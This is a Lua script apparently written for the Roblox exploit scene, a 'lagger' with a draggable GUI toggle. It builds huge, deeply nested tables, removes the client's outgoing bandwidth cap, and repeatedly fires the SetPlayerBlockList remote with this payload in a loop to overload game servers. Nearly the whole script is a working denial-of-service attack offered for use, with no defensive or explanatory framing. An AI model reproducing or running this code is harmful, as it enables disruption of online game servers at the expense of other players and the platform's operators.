local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
local LAGGER_CONFIG = isMobile and {TableIncrease = 290, Tries = 1, LoopWaitTime = 0.85} or {TableIncrease = 265, Tries = 1, LoopWaitTime = 0.05}
local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"
local function resolveRemote(path)
    local obj = game
    for segment in path:gsub("^game%.", ""):gmatch("[^%.]+") do
        if obj then obj = obj[segment] else return nil end
    end
    return obj
end
local function bomb(tableincrease, tries)
    local maintable, spammedtable = {}, {{}}
    local z = spammedtable[1]
    for i = 1, tableincrease do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    local maximum = 499999 / (tableincrease + 2)
    for i = 1, maximum do
        table.insert(maintable, spammedtable)
        if i % 5000 == 0 then task.wait() end
    end
    local remote = resolveRemote(CUSTOM_REMOTE_PATH)
    if remote then
        for i = 1, tries do
            pcall(function() remote:FireServer(maintable) end)
        end
    end
end
local laggerEnabled = false
local laggerThread = nil
local function toggleLaggerLoop(state)
    laggerEnabled = state
    if state then
        laggerThread = task.spawn(function()
            while laggerEnabled do
                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
                bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries)
                task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.15))
            end
        end)
    else
        if laggerThread then task.cancel(laggerThread) laggerThread = nil end
    end
end
local dragging, dragStart, startPos
Frame_1.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true dragStart = input.Position startPos = Frame_1.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        Frame_1.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
end)
